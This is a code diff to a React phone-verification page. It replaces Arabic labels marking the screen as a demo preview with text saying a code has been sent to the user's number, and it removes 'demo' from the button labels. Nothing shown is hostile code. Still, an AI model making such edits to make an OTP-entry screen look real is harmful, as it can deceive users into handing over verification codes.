@@ -1520,7 +1520,7 @@ export default function VerifyPhonePage() {
         ) : (
           <>
             <div style={{ fontSize: '16px', color: '#555555', marginBottom: '15px' }}>
-              معاينة شاشة إدخال رمز تجريبي
+             تم ارسال كود الي رقمك 
             </div>
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
@@ -1532,7 +1532,7 @@ export default function VerifyPhonePage() {
 
             <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
               <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
-                otp Code
+                OTP Code
               </label>
 
               <input
@@ -1581,7 +1581,7 @@ export default function VerifyPhonePage() {
                   opacity: isReferenceCodeValid && !isVerifying ? 1 : 0.7,
                 }}
               >
-                معاينة الرمز التجريبي
+                معاينة الرمز 
               </button>
             </form>
 
@@ -1590,7 +1590,7 @@ export default function VerifyPhonePage() {
               onClick={() => { setReferenceCode(''); setError(''); }}
               style={{ marginTop: '50px', color: '#1646a7', fontSize: '14px', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'none' }}
             >
-              مسح الرمز التجريبي
+              مسح الرمز 
             </button>
 
             <div style={{ marginTop: '40px', color: '#1646a7', fontSize: '14px', direction: 'ltr', fontWeight: 'bold' }}>
